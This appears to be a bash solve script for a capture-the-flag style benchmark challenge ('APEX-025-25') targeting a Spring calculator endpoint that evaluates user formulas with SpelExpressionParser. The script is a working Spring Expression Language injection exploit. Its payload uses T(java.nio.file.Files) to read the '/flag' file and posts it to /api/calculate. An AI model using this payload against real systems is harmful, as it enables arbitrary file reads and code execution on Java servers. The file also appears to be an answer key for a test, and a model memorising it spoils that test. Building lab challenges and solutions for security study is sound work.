#!/usr/bin/env bash
# APEX-025-25 — "Spring Expression Language (SpEL) Injection" (tags: spel, rce)
#
# `/api/calculate` takes a formula and hands it to `SpelExpressionParser`. SpEL
# is not an arithmetic language with a few extras; it is an expression language
# over the JVM, and `T(...)` names any class on the classpath. So a calculator
# that evaluates user formulae is a calculator that runs Java.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex025-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

FORMULA="new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))"

"$H5I" browser open "$URL/health" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/calculate \
    --set header.Content-Type=application/json \
    --set "json.formula=$FORMULA" | flag
